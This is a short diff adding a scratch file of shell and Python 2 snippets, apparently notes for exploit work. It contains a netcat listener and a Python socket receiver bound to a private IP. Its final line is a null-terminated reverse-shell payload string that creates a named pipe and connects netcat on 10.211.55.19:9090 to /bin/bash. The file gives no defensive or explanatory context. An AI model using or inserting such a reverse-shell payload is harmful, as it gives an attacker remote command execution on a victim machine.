@@ -1,0 +1,20 @@
+
+nc -l 12345 <&1 | ./exe > &0
+
+
+cmd 1>&2
+cmd 2>&1
+
+def receiver() :
+    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ss.bind( ( '10.211.55.19' , 9998) )
+    ss.listen(1)
+    while(True) :
+        conn, addr = ss.accept()
+        print conn.recv(1024)
+        conn.close()
+#threading.Thread(target=receiver).start()
+
+
+nc -lvvp 9090 wait
+cmd = "mknod backpipe p; nc 10.211.55.19 9090 0<backpipe | /bin/bash 1>backpipe\x00"
